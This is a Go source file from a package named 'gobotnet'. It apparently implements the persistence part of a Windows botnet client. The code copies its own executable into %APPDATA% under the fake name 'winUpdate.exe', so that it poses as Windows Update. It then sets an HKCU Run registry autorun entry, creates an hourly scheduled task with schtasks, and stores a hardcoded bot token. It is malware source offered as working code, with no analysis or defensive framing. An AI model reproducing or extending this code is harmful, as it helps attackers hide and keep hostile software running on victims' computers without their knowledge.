package gobotnet

import (
	"fmt"
	"golang.org/x/sys/windows/registry"
	"io/ioutil"
	"os"
)

var (
	programName        string = "winUpdate"
	copyProgramDir     string = os.Getenv("APPDATA") + `\WindowsUpdate`
	copyExecFilePath   string = copyProgramDir + `\` + programName + ".exe"
	tokenFile          string = copyProgramDir + `\` + programName + ".txt"
	sourceExecFilePath string = os.Args[0]
	token              string = "sfdsfdsfsdfsdgfdg4343643643"
)

func RegTest() {
	fmt.Println("REGISTRATION.GO TEST")

	CreateDir(copyProgramDir, 0777)
	if !CheckFileExist(tokenFile) {
		CreateFile(tokenFile)
		SaveToken(tokenFile, token)
		//CopyFileToDirectory(sourceExecFilePath, copyExecFilePath)
	} else {

	}
}

func RegisterProgram() {
	CreateDir(copyProgramDir, 0777)
	err := CopyFileToDirectory(sourceExecFilePath, copyExecFilePath)
	OutMessage(err.Error())
	err = RegisterAutoRun()
	OutMessage(err.Error())
}

func UnRegisterProgram() {
	UnRegisterAutoRun()
	DeleteFile(sourceExecFilePath)
	DeleteFile(copyExecFilePath)
}

func RegisterAutoRun() error {
	err := WriteRegistryKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, programName, copyExecFilePath)
	return err
}

func IsRegisterAutoRun() error {
	err := IsValueSetRegistryKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, programName)
	return err
}

func UnRegisterAutoRun() {
	DeleteRegistryKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, programName)
}

func RegisterSchedule(nameTask string, pathToFile string) ([]byte, error) {
	return CmdExec("schtasks /create /f /tn " + nameTask + " /sc hourly /mo 1 /tr " + pathToFile)
}

func IsRegisterSchedule(nameTask string) ([]byte, error) {
	return CmdExec("schtasks /query /tn " + nameTask + "\"")
}

func UnRegisterSchedule(nameTask string) ([]byte, error) {
	return CmdExec("schtasks /delete /f /tn " + nameTask)
}

func SaveToken(pathFile, token string) error {
	err := ioutil.WriteFile(pathFile, []byte(token), 0644)
	if err != nil {
		OutMessage(err.Error())
	}
	return err
}

func LoadToken(pathFile string) string {
	readBytes, err := ioutil.ReadFile(tokenFile)
	if err != nil {
		OutMessage(err.Error())
		return ""
	}
	return string(readBytes)
}
